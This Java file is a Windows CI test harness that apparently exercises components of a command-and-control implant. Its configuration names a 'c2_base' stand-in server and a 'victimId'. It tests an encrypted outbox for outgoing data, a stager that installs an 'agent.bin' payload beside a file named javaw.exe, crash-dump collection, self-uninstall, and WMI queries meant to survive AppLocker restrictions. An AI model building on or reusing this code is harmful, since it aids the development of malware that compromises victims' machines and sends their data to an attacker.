package com.spcagentpayloa.jvmxx.crypto;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * Windows CI gate. One scenario per invocation; exit 0 only when the invariant
 * holds. Linux-safe too, so a failure can be reproduced outside the runner.
 */
public final class WindowsGate {
	private WindowsGate() {
	}

	public static void main(String[] args) throws Exception {
		if (args.length < 2) {
			System.out.println("usage: WindowsGate <scenario> <workdir>");
			System.exit(2);
		}
		Path work = Files.createDirectories(Path.of(args[1]));
		switch (args[0]) {
			case "outbox-cross-volume" -> outbox(work, true, false);
			case "atomic-fallback" -> {
				System.setProperty("spc.forceNonAtomic", "1");
				outbox(work, false, true);
			}
			case "manifest" -> manifest(work);
			case "stager-version" -> stager(work);
			case "uninstall" -> uninstall(work);
			case "hs-err" -> hsErr(work);
			case "cim" -> cim();
			default -> throw new IllegalArgumentException("unknown scenario " + args[0]);
		}
		System.out.println("PASS " + args[0]);
	}

	private static CryptoConfig config() {
		Map<String, Object> map = new LinkedHashMap<>();
		map.put("build_id", "00000000-0000-4000-8000-000000000001");
		map.put("build_secret", Base64.getUrlEncoder().withoutPadding().encodeToString(CryptoUtil.random(32)));
		map.put("c2_base", "https://c2.example/api/v1");
		map.put("artifact_scheme", 2L);
		CryptoConfig config = new CryptoConfig(map);
		config.victimId("00000000-0000-4000-8000-000000000002");
		config.keySalt(1, Base64.getUrlEncoder().withoutPadding().encodeToString(CryptoUtil.random(32)));
		return config;
	}

	private static void outbox(Path work, boolean crossVolume, boolean forced) throws Exception {
		Path install = work.resolve(crossVolume ? "other-volume" : "same-volume");
		Outbox outbox = new Outbox(install, config(), null, null);
		Path dir = install.resolve("cache").resolve("outbox");
		Files.writeString(dir.resolve("tmp-orphan.bin"), "orphan");
		// A second instance must sweep the orphan and stay usable.
		outbox = new Outbox(install, config(), null, null);
		if (Files.exists(dir.resolve("tmp-orphan.bin"))) throw new AssertionError("orphan temp survived the sweep");
		outbox.enqueue("00000000-0000-4000-8000-000000000010", "gate".getBytes(StandardCharsets.UTF_8));
		Path entry;
		try (var stream = Files.list(dir)) {
			entry = stream.filter(Files::isRegularFile).findFirst().orElseThrow();
		}
		byte[] plain = outbox.read(entry);
		if (!"gate".equals(new String(plain, StandardCharsets.UTF_8))) throw new AssertionError("entry did not round-trip");
		if (forced && Files.readAllBytes(entry)[5] != 1) throw new AssertionError("non-atomic entry is not marked");
	}

	private static void manifest(Path work) throws Exception {
		Path one = jar(work, "Manifest-Version: 1.0\nMain-Class: a\n", "impl\n");
		Path services = jar(work, "Manifest-Version: 1.0\nMain-Class: a\n", "other\n");
		Path manifest = jar(work, "Manifest-Version: 1.0\nMain-Class: b\n", "impl\n");
		Class<?> stager = stagerClass();
		var hash = stager.getDeclaredMethod("hashFile", Path.class);
		hash.setAccessible(true);
		String base = (String) hash.invoke(null, one);
		if (base.equals(hash.invoke(null, services))) throw new AssertionError("services are not covered");
		if (base.equals(hash.invoke(null, manifest))) throw new AssertionError("manifest is not covered");
	}

	private static Class<?> stagerClass() throws Exception {
		Path classes = Path.of("..", "build", "classes", "java", "main").toAbsolutePath();
		Path resources = Path.of("..", "build", "resources", "main").toAbsolutePath();
		java.util.List<java.net.URL> urls = new java.util.ArrayList<>();
		urls.add(classes.toUri().toURL());
		urls.add(resources.toUri().toURL());
		String libs = System.getProperty("gate.gradleLibs", "");
		if (Files.isDirectory(Path.of(libs))) {
			try (var stream = Files.list(Path.of(libs))) {
				for (Path jar : stream.filter((path) -> path.toString().endsWith(".jar")).toList()) {
					urls.add(jar.toUri().toURL());
				}
			}
		}
		java.net.URLClassLoader loader = new java.net.URLClassLoader(
			urls.toArray(java.net.URL[]::new), WindowsGate.class.getClassLoader());
		return Class.forName("com.serverpackcore.stager.Stager", true, loader);
	}

	private static Path jar(Path work, String manifest, String services) throws Exception {
		Path target = Files.createTempFile(work, "gate-", ".jar");
		try (ZipOutputStream zip = new ZipOutputStream(Files.newOutputStream(target))) {
			zip.putNextEntry(new ZipEntry("META-INF/MANIFEST.MF"));
			zip.write(manifest.getBytes(StandardCharsets.UTF_8));
			zip.closeEntry();
			zip.putNextEntry(new ZipEntry("META-INF/services/x.Service"));
			zip.write(services.getBytes(StandardCharsets.UTF_8));
			zip.closeEntry();
			zip.putNextEntry(new ZipEntry("x.class"));
			zip.write("bytecode".getBytes(StandardCharsets.UTF_8));
			zip.closeEntry();
		}
		return target;
	}

	private static void stager(Path work) throws Exception {
		Path agent = work.resolve("runtime.jar");
		Path binary = work.resolve("javaw.exe");
		Files.copy(Path.of("..", "build", "resources", "main", "serverpackcore", "agent.bin"), agent);
		Files.writeString(binary, "runtime");
		Path marker = work.resolve(".version");
		Class<?> stager = stagerClass();
		var installed = stager.getDeclaredMethod("isInstalled", String.class, Path.class, Path.class, Path.class);
		installed.setAccessible(true);
		var expected = stager.getDeclaredMethod("expectedHash");
		expected.setAccessible(true);
		String hash = (String) expected.invoke(null);
		Files.writeString(marker, "0.2.33 " + hash);
		if (!(Boolean) installed.invoke(null, "0.2.33", marker, agent, binary)) throw new AssertionError("valid install rejected");
		Files.writeString(marker, "0.2.32 " + hash);
		if ((Boolean) installed.invoke(null, "0.2.33", marker, agent, binary)) throw new AssertionError("stale marker accepted");
		Files.writeString(marker, "0.2.33 " + "0".repeat(64));
		if ((Boolean) installed.invoke(null, "0.2.33", marker, agent, binary)) throw new AssertionError("wrong hash accepted");
	}

	private static void uninstall(Path work) throws Exception {
		Path dir = Files.createDirectories(work.resolve("install"));
		Files.writeString(dir.resolve("runtime.jar"), "open");
		Files.writeString(dir.resolve("cache.txt"), "data");
		ClassLoader loader = stagerClass().getClassLoader();
		Class<?> uninstall = Class.forName("com.spcagentpayloa.jvmxx.Uninstall", true, loader);
		var run = uninstall.getDeclaredMethod("run", Class.forName("com.spcagentpayloa.jvmxx.Poller", true, loader), Path.class, boolean.class);
		run.setAccessible(true);
		String result = (String) run.invoke(null, null, dir, true);
		Files.writeString(work.resolve("uninstall-result.txt"), String.valueOf(result));
		if (result == null || !result.startsWith("Uninstall scheduled")) throw new AssertionError(result);
		for (int i = 0; i < 15 && Files.exists(dir.resolve("runtime.jar")); i++) Thread.sleep(1_000L);
		if (Files.exists(dir.resolve("runtime.jar"))) {
			try (var tmp = Files.list(Path.of(System.getProperty("java.io.tmpdir")))) {
				for (Path script : tmp.filter((path) -> path.getFileName().toString().startsWith("spc-uninstall-")).toList()) {
					Files.copy(script, work.resolve(script.getFileName()));
				}
			}
			throw new AssertionError("runtime.jar still present: " + Files.list(dir).toList());
		}
		if (!Files.exists(dir.resolve("cache.txt"))) throw new AssertionError("--keep-data lost cache");
	}

	private static void hsErr(Path work) throws Exception {
		Path install = Files.createDirectories(work.resolve("install"));
		Path dump = work.resolve("hs_err_pid1234.log");
		Files.writeString(dump, "fatal");
		Class<?> reports = Class.forName("com.spcagentpayloa.jvmxx.CrashReports");
		var scan = reports.getDeclaredMethod("scan", Class.forName("com.spcagentpayloa.jvmxx.Poller"), Path.class, Path.class);
		scan.setAccessible(true);
		scan.invoke(null, null, install, work);
		Path moved = install.resolve("cache").resolve("crash").resolve("hs_err_pid1234.log");
		if (!Files.exists(moved)) throw new AssertionError("hs_err not moved");
		Path filtered = install.resolve("cache").resolve("crash").resolve("hs_err_pid1234.log.filtered");
		if (!Files.exists(filtered)) throw new AssertionError("filtered copy missing");
		if (!Files.readString(filtered).contains("fatal")) throw new AssertionError("filtered copy is empty");
	}

	private static void cim() throws Exception {
		Class<?> cim = Class.forName("com.spcagentpayloa.jvmxx.Cim");
		var rows = cim.getDeclaredMethod("rows", String.class, String.class, String.class, String.class);
		rows.setAccessible(true);
		// Empty is a valid CLM/AppLocker result: the gate proves it does not throw.
		rows.invoke(null, "Win32_OperatingSystem", null, null, "Caption");
	}
}
